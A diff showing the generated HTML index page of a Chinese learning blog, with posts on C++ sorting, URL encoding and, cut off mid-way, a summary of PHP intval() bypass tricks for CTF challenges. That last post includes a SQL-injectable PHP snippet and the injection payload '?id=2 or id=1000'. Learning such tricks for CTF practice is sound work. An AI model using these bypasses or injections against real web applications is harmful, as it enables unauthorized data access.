@@ -1,23 +1,2694 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
-{% block title %}{{ config.title }}{% if theme.index_with_subtitle and config.subtitle %} - {{config.subtitle }}{% endif %}{% endblock %}
 
-{% block page_class %}
-  {% if is_home() %}page-home{% endif -%}
-{% endblock %}
 
-{% block content %}
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是一个学习博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="yzklov">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="这是一个学习博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/"/>
+
+
+
+
+
+  <title>yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">nanashi</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
   <section id="posts" class="posts-expand">
-    {% for post in page.posts %}
-      {{ post_template.render(post, true) }}
-    {% endfor %}
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/blue-bridge-cup.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/blue-bridge-cup.html" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-03-15T09:23:53+08:00">
+                2024-03-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>竞赛章程：<a target="_blank" rel="noopener" href="https://dasai.lanqiao.cn/notices/839/">https://dasai.lanqiao.cn/notices/839/</a></p>
+<p>oi赛制</p>
+<h2 id="C-自带的sort排序函数的使用"><a href="#C-自带的sort排序函数的使用" class="headerlink" title="C++自带的sort排序函数的使用"></a>C++自带的sort排序函数的使用</h2><p>需要引用算法库</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>通过写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(arr,arr+5)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以将arr中从开始的元素到第5个元素按从小到大的顺序排列</p>
+<p>而如果我们写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(arr+i,arr+j)</span><br></pre></td></tr></table></figure>
+
+<p>那么被排序的将是arr[i]到arr[j-1]，其他元素将保持原位置</p>
+<p>默认是从小到大排序，如果要从大到小排，则可以传入第三个参数–排序方法：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="built_in">sort</span>(arr,arr+<span class="number">5</span>,<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br></pre></td></tr></table></figure>
+
+<p>其中，greater表示更大的意思，<code>&lt;int&gt;</code>表示待排序的数组中的元素类型为int</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> arr[]=&#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>&#125;;</span><br><span class="line">	sort(arr,arr+<span class="number">5</span>,greater&lt;<span class="type">int</span>&gt;());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串的两种风格"><a href="#字符串的两种风格" class="headerlink" title="字符串的两种风格"></a>字符串的两种风格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//c风格字符串</span><br><span class="line">char arr[]=&quot;hello world&quot;;</span><br><span class="line">//c++风格字符串</span><br><span class="line">#include &lt;string&gt; //在使用c++风格的字符串要包含这个头文件</span><br><span class="line">string arr = &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
+
+<p>c++读入字符串并打印</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string arr = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	cout &lt;&lt; arr &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>c语言读入字符串并打印</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入字符串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;您输入的字符串是：%s\n&quot;</span>, str);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>c语言读入整形数组元素并打印</p>
+<p>需要注意的是scanf读入的时候遇到空白字符（空格、制表符、换行符等）或者文件结束符时停止读取，所以输入的时候数字要通过空格或者换行隔开</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr,arr+<span class="number">10</span>,greater&lt;<span class="type">int</span>&gt;());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[j]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; arr[j] &lt;&lt; &quot; &quot;; //空格隔开</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/hello-world.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/hello-world.html" itemprop="url">Hello World</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-03-14T21:37:36+08:00">
+                2024-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/hackergame2023-misc.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/hackergame2023-misc.html" itemprop="url">hackergame2023_misc</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-11-29T23:17:07+08:00">
+                2023-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E7%BC%96%E7%A0%81.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E7%BC%96%E7%A0%81.html" itemprop="url">编码</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-11-04T16:37:31+08:00">
+                2023-11-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="浏览器url编码"><a href="#浏览器url编码" class="headerlink" title="浏览器url编码"></a>浏览器url编码</h2><p>1.将空格转换为加号（+）</p>
+<p>2.对0-9、a-z、A-Z之间的字符保持不变</p>
+<p>3.对于所有其他的字符，用这个字符的当前当前字符集编码在内存中的十六进制格式表示，并在每一个字节前加上一个百分号（%），如字符“+”是用%2B表示，字符“&#x3D;”用%3D表示，字符“&amp;”用%26表示，每个中文字符在内存中占两个字节，字符“中”用%D6%D0表示，字符“国”用%B9%FA表示。</p>
+<p>4.空格也可以直接用其十六进制编码方式，即用%20表示，而不是将它转换为加号（+）</p>
+<p>5、浏览器通常会对URL中的其他特殊字符，如空格（编码为<code>%20</code>）、斜杠（编码为<code>%2F</code>）、冒号（编码为<code>%3A</code>）等进行编码，以确保URL的正确性和可传输性。但对于<code>&amp;</code>字符，通常不进行编码，因为它在URL中有特定的分隔作用。</p>
+<p>6、浏览器通常不会对竖线字符（<code>|</code>）进行编码，因为竖线在URL中通常被视为普通字符，而不是特殊字符。 URL编码主要用于将特殊字符转换为URL安全格式，以确保它们可以正确传输和解析，同时不干扰URL的结构</p>
+<p>在使用url进行参数传递时，经常会传递一些中文名（或含有特殊字符）的参数或URL地址，在后台处理时会发生转换错误。这些特殊符号在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>特殊字符</th>
+<th>含义</th>
+<th>十六进制值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>+</td>
+<td>URL 中+号表示空格</td>
+<td>%2B</td>
+</tr>
+<tr>
+<td>2</td>
+<td>空格</td>
+<td>URL中的空格可以用+号或者编码</td>
+<td>%20</td>
+</tr>
+<tr>
+<td>3</td>
+<td>&#x2F;</td>
+<td>分隔目录和子目录</td>
+<td>%2F</td>
+</tr>
+<tr>
+<td>4</td>
+<td>?</td>
+<td>分隔实际的 URL 和参数</td>
+<td>%3F</td>
+</tr>
+<tr>
+<td>5</td>
+<td>%</td>
+<td>指定特殊字符</td>
+<td>%25</td>
+</tr>
+<tr>
+<td>6</td>
+<td>#</td>
+<td>表示书签</td>
+<td>%23</td>
+</tr>
+<tr>
+<td>7</td>
+<td>&amp;</td>
+<td>URL 中指定的参数间的分隔符</td>
+<td>%26</td>
+</tr>
+<tr>
+<td>8</td>
+<td>&#x3D;</td>
+<td>URL 中指定参数的值</td>
+<td>%3D</td>
+</tr>
+</tbody></table>
+<p><img src="/img/image-20231104164730812.png" alt="image-20231104164730812"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/php%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/php%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html" itemprop="url">php函数绕过总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-11-01T21:11:55+08:00">
+                2023-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>函数绕过的前提是对应的php版本</p>
+<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure>
+
+<p>函数作用：获取变量的整数值</p>
+<p>0x:16   0:8  0b:2  默认10</p>
+<h3 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h3><p>当函数中用<code>字符串</code>方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo intval(1e10);              // 1410065408</span><br><span class="line">echo intval(&#x27;1e10&#x27;);            // 1</span><br><span class="line">echo intval(&#x27;1e10&#x27;+1);          // 1410065409</span><br></pre></td></tr></table></figure>
+
+<p>应用场景：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (intval($_GET[&#x27;lover&#x27;]) &lt; 2023 &amp;&amp; intval($_GET[&#x27;lover&#x27;] + 1) &gt; 2024)</span><br></pre></td></tr></table></figure>
+
+<h3 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h3><p>当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过。</p>
+<p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p>
+<ul>
+<li><p>如果 $var 以 0 开头，就使用 8进制</p>
+</li>
+<li><p>如果 $var 以0x开头，就使用 16进制</p>
+</li>
+<li><p>否则，就使用 10进制</p>
+</li>
+</ul>
+<h3 id="转换字符串特性绕过"><a href="#转换字符串特性绕过" class="headerlink" title="转换字符串特性绕过"></a>转换字符串特性绕过</h3><ul>
+<li>如果以数字开头，就返回1个或多个连续的数字</li>
+<li>如果以字母开头，就返回0</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span><br><span class="line">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">&lt;!-- flag in id = <span class="number">1000</span> --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>?id=2 or id=1000</code></p>
+<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素，有为1无为0</p>
+<p>三种数组写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a[]=1;</span><br><span class="line">     </span><br><span class="line">$a=array(1,2);</span><br><span class="line">     </span><br><span class="line">$a=[1,2];</span><br></pre></td></tr></table></figure>
+
